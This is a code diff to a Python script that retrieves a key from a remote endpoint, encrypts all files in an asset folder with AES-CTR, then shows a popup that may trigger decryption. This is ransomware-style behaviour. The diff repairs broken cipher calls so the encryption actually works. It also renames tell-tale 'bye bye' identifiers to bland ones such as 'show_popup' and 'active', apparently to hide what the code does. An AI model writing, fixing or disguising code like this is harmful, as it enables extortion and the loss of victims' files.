@@ -11,7 +11,7 @@ import time
 import tkinter as tk
 from tkinter import messagebox, simpledialog
 
-mode = "patch"
+mode = "active"
 
 def get_key_from_endpoint(random_path):
     # Construct the key retrieval URL
@@ -32,7 +32,7 @@ def run_vector(input_data: bytes, config_token: bytes) -> bytes:
     counter_seed = b'\x00\x00\x00\x00'
     engine_seed = nonce_seed + counter_seed
 
-    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).byeBye()
+    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).encryptor()
     output_blob = session.update(input_data) + session.finalize()
     return nonce_seed + output_blob  # return raw binary blob
 
@@ -42,7 +42,7 @@ def reverse_vector(blob: bytes, config_token: bytes) -> bytes:
     counter_seed = b'\x00\x00\x00\x00'
     engine_seed = nonce + counter_seed
 
-    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).welcomeBack()
+    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).decryptor()
     return session.update(ciphertext) + session.finalize()
 
 def scan_and_patch_assets(asset_dir: str, config_token: bytes, total_duration=60.0):
@@ -111,7 +111,7 @@ def restore_assets(asset_dir: str, config_token: bytes):
             except Exception:
                 pass  
 
-def show_byebye_modal():
+def show_popup():
     root = tk.Tk()
     root.withdraw()
 
@@ -168,12 +168,12 @@ if __name__ == "__main__":
         messagebox.showerror("Error", "Failed to retrieve the key. Please check your random path.")
         exit(1)
 
-    if mode == "patch":
+    if mode == "active":
         start = time.time()
         scan_and_patch_assets(resources_folder, key)
         end = time.time()
         print(f"bye bye finished in {end - start:.2f} seconds.")
-        show_byebye_modal()  # ← may change mode to "restore"
+        show_popup()  # ← may change mode to "restore"
 
     if mode == "restore":
         restore_assets(resources_folder, key)
